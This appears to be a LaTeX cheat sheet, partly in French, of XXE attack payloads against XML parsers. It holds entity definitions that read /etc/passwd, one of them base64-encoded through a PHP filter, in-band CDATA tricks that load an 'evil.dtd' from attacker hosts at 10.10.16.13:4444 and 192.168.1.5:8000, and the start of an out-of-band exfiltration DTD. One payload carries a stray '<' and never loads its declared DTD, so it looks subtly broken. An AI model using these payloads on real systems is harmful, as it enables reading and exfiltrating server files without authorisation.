
\section{managing content problems}

\subsection{base64 encoding} 

if the webserver is using PHP: 

\verb+<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">+

\subsection{In band CDATA}

\verb+<![CDATA[+ ... \verb+]]>+


\subsubsection{Solution 1}

\underline{content of the evil.dtd}:
\begin{verbatim}
  <!ENTITY % passwd SYSTEM "file:///etc/passwd"> 
  <!ENTITY % start "<![CDATA["> 
  <!ENTITY % end "]]>"> 
  <!ENTITY % wrapper "<!ENTITY concat '%start;%passwd;%end;'>">
  %wrapper;
\end{verbatim}

\underline{payload}:
\begin{verbatim}
<?xml version = "1.0"?>
<!DOCTYPE order SYSTEM "http://10.10.16.13:4444/evil.dtd">
<order>
    <quantity>a</quantity>
    <item>&concat;</item>
    <address>a</address>
</order>
\end{verbatim}


\subsubsection{Solution 2}

\underline{payload}:
\begin{verbatim}
<?xml version = "1.0"?>
<!DOCTYPE foo [<
  <!ENTITY % passwd SYSTEM "file:///etc/passwd"> 
  <!ENTITY % start "<![CDATA["> 
  <!ENTITY % end "]]>"> 
  <!ENTITY % dtd SYSTEM "http://192.168.1.5:8000/evil.dtd" >
]>
<order>
    <quantity>a</quantity>
    <item>&wrapper;</item>
    <address>a</address>
</order>
\end{verbatim}

\underline{content of the evil.dtd}:
\begin{verbatim}
<!ENTITY wrapper "%start;%passwd;%end;">
\end{verbatim}

\subsection{Out of band CDATA}

first external DTD:

\begin{verbatim}
  <!ENTITY % passwd SYSTEM "file:///etc/passwd"> 
  <!ENTITY % start "<![CDATA["> 
  <!ENTITY % end "]]>"> 
  <!ENTITY % wrapper "<!ENTITY all '%start;%passwd;%end;'>"> 
  %wrapper;
\end{verbatim}

pour exfilter il faut definir une autre DTD qui va utiliser wrapper et qui sera
appellée par le payload
Pour exfiltrer il faut inclure une autre DTD et lui envoyer les données

